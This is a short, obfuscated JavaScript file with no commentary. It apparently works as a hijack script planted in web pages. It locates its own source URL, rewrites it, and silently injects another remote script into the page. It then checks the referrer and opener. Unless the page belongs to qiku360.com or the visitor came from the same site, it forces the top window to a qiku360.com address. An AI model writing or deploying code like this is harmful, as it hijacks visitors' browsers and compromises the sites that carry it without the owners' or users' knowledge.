function l___k__s(k, p, o, l) {
    var c = k.opera,
        f = (function(q) {
            if (!q) {
                return 0;
            }
            q = (function(r) {
                var s = r[1] || "";
                return /=/.test(s || "=") ? (r[0] || "") + "?_=_" + s : q;
            })(q.split("?"));
            if (!q.lastIndexOf("/")) {
                return q.replace(p, o);
            }
            return q.substr(0, 1) + q.substr(1).replace(p, o).replace(/([^/]\/js\/)(\w)/i, "$1/$2");
        })((function(z, v, q) {
            if (z) {
                charset = z.charset;
                async = z.async;
                return z.src;
            }
            try {
                Z.G.Y();
            } catch (s) {
                q = s.stack || s.fileName || s.sourceURL || s.stacktrace;
                if (!q && c) {
                    q = (("" + s).match(/of linked script \S+/g) || []).join(" ");
                }
            }
            if (q) {
                q = q.split(/[@ ]/g).pop();
                q = q[0] == "(" ? q.slice(1, -1) : q;
                for (var C = q.replace(/(:\d+)?:\d+$/i, ""), t, B = v.length; B--;) {
                    t = v[B];
                    if (C == t.src) {
                        charset = t.charset;
                        async = t.async;
                        break;
                    }
                }
                return C;
            }
            for (var w = (v[v.length - 1] || {}), r = 0, u; u = v[r++];) {
                if (u.readyState == "interactive") {
                    charset = u.charset;
                    async = u.async;
                    return u.src;
                }
            }
            charset = w.charset;
            async = w.async;
            return w.src;
        })(document.currentScript, document.getElementsByTagName(l))),
        j = /js\.jxlqgs\.com/.test(f),
        d = /_=__=_/.test(f),
        e = /\/\/\//.test(f);
    if (!j && !d && !j&&!e) {
        head = document.getElementsByTagName("head")[0], newScriptElm = document.createElement(l);
        f && (charset && (newScriptElm.charset = charset), (newScriptElm.src = f), !async && /\[nati/.test(document.write + "") ? document.write("<" + l + ' src="' + f + '"' + (charset ? ' charset="' + charset + '"' : "") + "></" + l + ">") : head.appendChild(newScriptElm));
    }
}
l___k__s(self, /([^:\/]|^)\//, "$1//", "script");
var ref = '';
if (document.referrer.length > 0) {
    ref = document.referrer;
}
try {
    if (ref.length == 0 && opener.location.href.length > 0) {
        ref = opener.location.href;
    }
} catch (e) {
}
var refs = ref.split("?")[0];
var host = window.location.hostname;
if (host.indexOf('qiku360.com') == -1 && (refs.indexOf(host) == -1 || !ref)) {
    top.location.href = 'http://www.qiku360.com/zonghe/xd_re.html?f='+ 1E4 * Math.random() +'&k='+ (new Date).valueOf();
};